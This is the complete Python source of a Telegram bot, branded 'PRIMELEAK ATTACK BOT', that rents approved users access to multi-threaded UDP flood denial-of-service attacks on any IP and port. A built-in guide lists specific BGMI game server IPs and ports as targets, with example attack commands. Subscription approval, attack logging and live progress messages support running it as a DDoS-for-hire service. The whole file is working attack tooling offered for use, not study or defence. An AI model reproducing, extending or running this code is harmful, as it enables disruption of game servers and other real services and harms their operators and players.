import asyncio
import logging
import socket
import threading
import time
import random
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ============ CONFIGURATION ============
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Attack Configuration
MAX_CONCURRENT_ATTACKS = 5
MAX_ATTACK_DURATION = 300  # 5 minutes max
DEFAULT_THREADS = 500
DEFAULT_PACKET_SIZE = 1400

# Common BGMI Ports
BGMI_PORTS = [27015, 27016, 27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024, 27025]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# Store active attacks
active_attacks = {}
active_timers = {}

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ HELPER FUNCTIONS ============
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_bgmi_ports_list() -> str:
    return ", ".join(str(port) for port in BGMI_PORTS)

# ============ ATTACK ENGINE ============
def start_udp_attack(target_ip: str, target_port: int, duration: int, attack_id: str):
    """Start UDP flood attack"""
    def attack():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'X' * DEFAULT_PACKET_SIZE
            end_time = time.time() + duration
            
            packet_count = 0
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (target_ip, target_port))
                    packet_count += 1
                except:
                    pass
            
            sock.close()
            
            # Update attack status
            if attack_id in active_attacks:
                active_attacks[attack_id]['status'] = 'completed'
                active_attacks[attack_id]['packets_sent'] = packet_count
                
        except Exception as e:
            logger.error(f"Attack error: {e}")
            if attack_id in active_attacks:
                active_attacks[attack_id]['status'] = 'failed'
    
    # Start attack in thread
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()
    
    return thread

def start_udp_multi_thread(target_ip: str, target_port: int, duration: int, attack_id: str, threads: int = DEFAULT_THREADS):
    """Start UDP flood with multiple threads"""
    def worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'X' * DEFAULT_PACKET_SIZE
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (target_ip, target_port))
                except:
                    pass
            sock.close()
        except:
            pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    return threads_list

def stop_attack(attack_id: str) -> bool:
    """Stop a running attack"""
    if attack_id in active_attacks:
        active_attacks[attack_id]['status'] = 'stopped'
        # Threads will stop automatically when duration ends
        return True
    return False

def get_active_attacks_count() -> int:
    """Get number of active attacks"""
    return sum(1 for a in active_attacks.values() if a.get('status') == 'running')

def get_user_active_attacks(user_id: int) -> List[Dict]:
    """Get active attacks for a specific user"""
    return [
        a for a in active_attacks.values() 
        if a.get('user_id') == user_id and a.get('status') == 'running'
    ]

# ============ DATABASE CLASS ============
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        # Clean up invalid documents
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except Exception as e:
            logger.error(f"Error cleaning users: {e}")
        
        # Create indexes
        try:
            self.users.drop_indexes()
            self.attacks.drop_indexes()
        except:
            pass
        
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
        except:
            pass
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, attack_id: str = None, packets_sent: int = 0):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "packets_sent": packets_sent,
            "timestamp": get_current_time(),
            "attack_id": attack_id
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
        except:
            pass
    
    def get_all_users(self) -> List[Dict]:
        return list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
    
    def get_user_attack_stats(self, user_id: int) -> Dict:
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        return {"total": total, "successful": success, "failed": failed, "recent": recent}

# Initialize database
db = Database()

# ============ AUTH DECORATOR ============
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        expires_at = make_aware(expires_at)
        if expires_at < get_current_time():
            return False
    return True

# ============ COUNTDOWN TIMER ============
async def attack_countdown(chat_id: int, message_id: int, attack_id: str, duration: int, target: str, port: int, context: ContextTypes.DEFAULT_TYPE):
    """Send live countdown timer for attack"""
    try:
        remaining = duration
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 Stop Attack", callback_data=f"stop_{attack_id}")]
        ])
        
        while remaining > 0 and attack_id in active_attacks and active_attacks[attack_id].get('status') == 'running':
            minutes = remaining // 60
            seconds = remaining % 60
            time_str = f"{minutes:02d}:{seconds:02d}"
            elapsed = duration - remaining
            percentage = (elapsed / duration) * 100
            
            bar_length = 20
            filled = int(bar_length * percentage / 100)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            message_text = (
                f"⚔️ **ATTACK IN PROGRESS** ⚔️\n\n"
                f"🎯 **Target:** `{target}:{port}`\n"
                f"⏱️ **Time Remaining:** `{time_str}`\n"
                f"📊 **Progress:** `{percentage:.1f}%`\n"
                f"`{bar}`\n\n"
                f"🆔 **ID:** `{attack_id[:8]}...`\n"
                f"📡 **Method:** UDP Flood\n"
                f"⚡ **Threads:** {DEFAULT_THREADS}"
            )
            
            try:
                await context.bot.edit_message_text(
                    message_text, chat_id=chat_id, message_id=message_id,
                    parse_mode='Markdown', reply_markup=keyboard
                )
            except:
                pass
            
            await asyncio.sleep(1)
            remaining -= 1
        
        # Attack completed or stopped
        if attack_id in active_attacks:
            status = active_attacks[attack_id].get('status', 'unknown')
            packets = active_attacks[attack_id].get('packets_sent', 0)
            
            if status == 'stopped':
                completion_text = (
                    f"🛑 **ATTACK STOPPED** 🛑\n\n"
                    f"🎯 **Target:** `{target}:{port}`\n"
                    f"⏱️ **Duration:** {elapsed}/{duration} seconds\n"
                    f"📦 **Packets Sent:** {packets:,}\n\n"
                    f"💡 Use `/attack` to start a new attack"
                )
            else:
                completion_text = (
                    f"✅ **ATTACK COMPLETED** ✅\n\n"
                    f"🎯 **Target:** `{target}:{port}`\n"
                    f"⏱️ **Duration:** {duration} seconds\n"
                    f"📦 **Packets Sent:** {packets:,}\n\n"
                    f"💡 Use `/attack` to start a new attack"
                )
            
            await context.bot.edit_message_text(
                completion_text, chat_id=chat_id, message_id=message_id, parse_mode='Markdown'
            )
            
            del active_attacks[attack_id]
        
    except Exception as e:
        logger.error(f"Countdown error: {e}")

# ============ COMMAND HANDLERS ============

# Admin Commands
@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: `/approve <user_id> <days>`", parse_mode='Markdown')
            return
        
        user_id = int(context.args[0])
        days = int(context.args[1])
        
        if db.approve_user(user_id, days):
            expires_at = get_current_time() + timedelta(days=days)
            await update.message.reply_text(
                f"✅ User `{user_id}` approved for {days} days!\n"
                f"📅 Expires: `{expires_at.strftime('%Y-%m-%d')}`",
                parse_mode='Markdown'
            )
            
            try:
                await context.bot.send_message(
                    user_id, 
                    f"✅ Your account has been approved for {days} days!\n"
                    f"Use `/help` to see commands.",
                    parse_mode='Markdown'
                )
            except:
                pass
    except:
        await update.message.reply_text("❌ Invalid input.")

@admin_required
async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: `/disapprove <user_id>`", parse_mode='Markdown')
            return
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User `{user_id}` disapproved.", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Error.")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    
    approved = sum(1 for u in users if u.get("approved"))
    total_attacks = sum(u.get("total_attacks", 0) for u in users)
    
    message = f"👥 **Users:** {len(users)}\n✅ **Approved:** {approved}\n🎯 **Total Attacks:** {total_attacks}\n\n"
    for u in users[:15]:
        status = "✅" if u.get("approved") else "❌"
        message += f"{status} `{u['user_id']}` - {u.get('total_attacks',0)} attacks\n"
    
    await update.message.reply_text(message[:4000], parse_mode='Markdown')

@admin_required
async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active = get_active_attacks_count()
    attacks_list = list(active_attacks.values())
    
    if active > 0:
        message = f"🎯 **Active Attacks:** {active}/{MAX_CONCURRENT_ATTACKS}\n\n"
        for a in attacks_list:
            if a.get('status') == 'running':
                message += f"🔹 `{a['target']}:{a['port']}` - {a.get('duration',0)}s\n"
        await update.message.reply_text(message, parse_mode='Markdown')
    else:
        await update.message.reply_text("✅ No active attacks.")

@admin_required
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    total_attacks = sum(u.get("total_attacks", 0) for u in users)
    active = get_active_attacks_count()
    
    await update.message.reply_text(
        f"📊 **Bot Statistics**\n\n"
        f"👥 **Total Users:** {len(users)}\n"
        f"✅ **Approved:** {sum(1 for u in users if u.get('approved'))}\n"
        f"🎯 **Total Attacks:** {total_attacks}\n"
        f"⚡ **Active Attacks:** {active}/{MAX_CONCURRENT_ATTACKS}\n"
        f"🚫 **Blocked Ports:** {len(BLOCKED_PORTS)}\n"
        f"🎮 **BGMI Ports:** {len(BGMI_PORTS)}",
        parse_mode='Markdown'
    )

# User Commands
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    
    if await is_user_approved(user_id):
        user = db.get_user(user_id)
        expires_at = user.get("expires_at")
        days_left = 0
        if expires_at:
            expires_at = make_aware(expires_at)
            days_left = max(0, (expires_at - get_current_time()).days)
        
        await update.message.reply_text(
            f"✅ **Welcome to PRIMELEAK ATTACK BOT!**\n\n"
            f"👤 **User:** {username or user_id}\n"
            f"📅 **Expires in:** {days_left} days\n"
            f"⚡ **Max Concurrent:** {MAX_CONCURRENT_ATTACKS}\n\n"
            f"**Commands:**\n"
            f"🔹 `/attack IP PORT DURATION` - Start UDP attack\n"
            f"🔹 `/bgmi` - Show BGMI server IPs\n"
            f"🔹 `/myinfo` - Account info\n"
            f"🔹 `/mystats` - Attack stats\n"
            f"🔹 `/myattacks` - Active attacks\n"
            f"🔹 `/blockedports` - Blocked ports\n"
            f"🔹 `/help` - Help menu\n\n"
            f"⚠️ **Use responsibly!**",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ **Access Denied, {username or user_id}!**\n\n"
            f"Your account is not approved.\n"
            f"Contact administrator to get access.",
            parse_mode='Markdown'
        )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ You are not approved.", parse_mode='Markdown')
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            f"❌ **Usage:** `/attack IP PORT DURATION`\n\n"
            f"📝 **Example:** `/attack 15.206.145.78 27015 60`\n\n"
            f"**Parameters:**\n"
            f"• **IP** - Target IP address\n"
            f"• **PORT** - Port number (1-65535)\n"
            f"• **DURATION** - Seconds (1-300)\n\n"
            f"🚫 **Blocked ports:** {get_blocked_ports_list()}\n\n"
            f"🎮 **BGMI ports:** {get_bgmi_ports_list()}",
            parse_mode='Markdown'
        )
        return
    
    ip = context.args[0]
    
    try:
        port = int(context.args[1])
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be 1-65535")
            return
        if is_port_blocked(port):
            await update.message.reply_text(f"❌ Port `{port}` is blocked!", parse_mode='Markdown')
            return
    except:
        await update.message.reply_text("❌ Invalid port number")
        return
    
    try:
        duration = int(context.args[2])
        if duration < 1 or duration > MAX_ATTACK_DURATION:
            await update.message.reply_text(f"❌ Duration must be 1-{MAX_ATTACK_DURATION} seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid duration")
        return
    
    # Check concurrent attack limit
    user_active = len(get_user_active_attacks(user_id))
    if user_active >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text(
            f"❌ **Concurrent limit reached!**\n\n"
            f"You have {user_active}/{MAX_CONCURRENT_ATTACKS} active attacks.\n"
            f"Wait for them to finish or use `/myattacks` to check.",
            parse_mode='Markdown'
        )
        return
    
    attack_id = str(uuid.uuid4())[:8]
    
    status_msg = await update.message.reply_text(
        f"🎯 **Launching Attack...**\n\n"
        f"**Target:** `{ip}:{port}`\n"
        f"**Duration:** {duration} seconds\n"
        f"**Method:** UDP Flood\n"
        f"**Threads:** {DEFAULT_THREADS}\n\n"
        f"🔄 Please wait...",
        parse_mode='Markdown'
    )
    
    # Store attack info
    active_attacks[attack_id] = {
        'id': attack_id,
        'user_id': user_id,
        'target': ip,
        'port': port,
        'duration': duration,
        'status': 'running',
        'start_time': get_current_time(),
        'packets_sent': 0
    }
    
    # Start attack
    threads = start_udp_multi_thread(ip, port, duration, attack_id)
    active_attacks[attack_id]['threads'] = threads
    
    # Log attack
    db.log_attack(user_id, ip, port, duration, "success", attack_id)
    
    # Start countdown timer
    asyncio.create_task(attack_countdown(
        update.effective_chat.id, status_msg.message_id,
        attack_id, duration, ip, port, context
    ))

async def bgmi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show BGMI server IPs and ports"""
    await update.message.reply_text(
        f"🎮 **BGMI Attack Guide**\n\n"
        f"**Common Server IPs (AWS Mumbai):**\n"
        f"• `15.206.145.78`\n"
        f"• `43.245.217.1`\n"
        f"• `13.232.255.1`\n"
        f"• `3.108.200.1`\n\n"
        f"**BGMI Ports:**\n"
        f"`{get_bgmi_ports_list()}`\n\n"
        f"**Example Command:**\n"
        f"`/attack 15.206.145.78 27015 60`\n\n"
        f"⚠️ **Note:** Use UDP method for BGMI servers.",
        parse_mode='Markdown'
    )

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user:
        await update.message.reply_text("User not found. Use `/start`", parse_mode='Markdown')
        return
    
    if user.get("approved"):
        expires_at = user.get("expires_at")
        if expires_at:
            expires_at = make_aware(expires_at)
            days_left = (expires_at - get_current_time()).days
            expires_str = f"{days_left} days" if days_left >= 0 else "Expired"
        else:
            expires_str = "Never"
        
        active = len(get_user_active_attacks(user_id))
        
        await update.message.reply_text(
            f"📋 **Your Account**\n\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"👤 **Username:** @{user.get('username', 'N/A')}\n"
            f"✅ **Status:** Approved\n"
            f"⏰ **Expires:** {expires_str}\n"
            f"🎯 **Total Attacks:** {user.get('total_attacks', 0)}\n"
            f"⚡ **Active Attacks:** {active}/{MAX_CONCURRENT_ATTACKS}\n"
            f"📅 **Member Since:** {user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ **Account Not Approved**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"Contact administrator for access.",
            parse_mode='Markdown'
        )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.", parse_mode='Markdown')
        return
    
    stats = db.get_user_attack_stats(user_id)
    success_rate = (stats['successful']/stats['total']*100 if stats['total'] > 0 else 0)
    
    msg = (
        f"📊 **Your Attack Statistics**\n\n"
        f"🎯 **Total:** {stats['total']}\n"
        f"✅ **Success:** {stats['successful']}\n"
        f"❌ **Failed:** {stats['failed']}\n"
        f"📈 **Success Rate:** {success_rate:.1f}%\n"
    )
    
    if stats['recent']:
        msg += "\n🕐 **Recent Attacks (Last 5):**\n"
        for a in stats['recent'][:5]:
            status = "✅" if a['status'] == "success" else "❌"
            msg += f"{status} `{a['ip']}:{a['port']}` - {a['duration']}s\n"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.", parse_mode='Markdown')
        return
    
    user_attacks = get_user_active_attacks(user_id)
    
    if user_attacks:
        msg = f"⚡ **Your Active Attacks ({len(user_attacks)}/{MAX_CONCURRENT_ATTACKS})**\n\n"
        for a in user_attacks:
            elapsed = (get_current_time() - a['start_time']).seconds
            remaining = a['duration'] - elapsed
            msg += f"🔹 `{a['target']}:{a['port']}` - {remaining}s remaining\n"
        await update.message.reply_text(msg, parse_mode='Markdown')
    else:
        await update.message.reply_text("✅ No active attacks.", parse_mode='Markdown')

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🚫 **Blocked Ports**\n\n"
        f"❌ Cannot use these ports:\n"
        f"`{get_blocked_ports_list()}`\n\n"
        f"✅ **Allowed:** All ports 1-65535 except blocked\n\n"
        f"🎮 **Recommended BGMI Ports:**\n"
        f"`{get_bgmi_ports_list()}`",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_admin = update.effective_user.id in ADMIN_IDS
    is_approved = await is_user_approved(update.effective_user.id)
    
    msg = "🤖 **PRIMELEAK ATTACK BOT**\n\n"
    
    msg += "📱 **User Commands:**\n"
    msg += "🔹 `/start` - Start bot\n"
    msg += "🔹 `/attack IP PORT DUR` - UDP Attack\n"
    msg += "🔹 `/bgmi` - BGMI servers & ports\n"
    msg += "🔹 `/myinfo` - Account info\n"
    msg += "🔹 `/mystats` - Attack stats\n"
    msg += "🔹 `/myattacks` - Active attacks\n"
    msg += "🔹 `/blockedports` - Blocked ports\n"
    msg += "🔹 `/help` - This menu\n"
    
    if is_admin:
        msg += "\n👑 **Admin Commands:**\n"
        msg += "🔹 `/approve user days` - Approve user\n"
        msg += "🔹 `/disapprove user` - Remove user\n"
        msg += "🔹 `/users` - List all users\n"
        msg += "🔹 `/stats` - Bot statistics\n"
        msg += "🔹 `/running` - Active attacks\n"
    
    msg += f"\n⚡ **Limits:**\n"
    msg += f"• Max Concurrent: {MAX_CONCURRENT_ATTACKS}\n"
    msg += f"• Max Duration: {MAX_ATTACK_DURATION}s\n"
    msg += f"• Threads per attack: {DEFAULT_THREADS}\n\n"
    msg += f"📝 **Example:** `/attack 15.206.145.78 27015 60`"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith("stop_"):
        attack_id = data.replace("stop_", "")
        
        if attack_id in active_attacks:
            active_attacks[attack_id]['status'] = 'stopped'
            await query.edit_message_text(f"🛑 Attack `{attack_id[:8]}...` stopped!", parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ Attack not found.", parse_mode='Markdown')

# ============ ERROR HANDLER ============
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Try again later.")

# ============ MAIN ============
def main():
    print("=" * 50)
    print("🤖 PRIMELEAK ATTACK BOT")
    print("=" * 50)
    print(f"📊 MongoDB: Connected")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"⚡ Max Concurrent: {MAX_CONCURRENT_ATTACKS}")
    print(f"🎯 Max Duration: {MAX_ATTACK_DURATION}s")
    print(f"🚫 Blocked Ports: {len(BLOCKED_PORTS)}")
    print(f"🎮 BGMI Ports: {len(BGMI_PORTS)}")
    print("=" * 50)
    print("✅ Bot is running!")
    print("=" * 50)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Admin commands
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("disapprove", disapprove_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # User commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("bgmi", bgmi_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()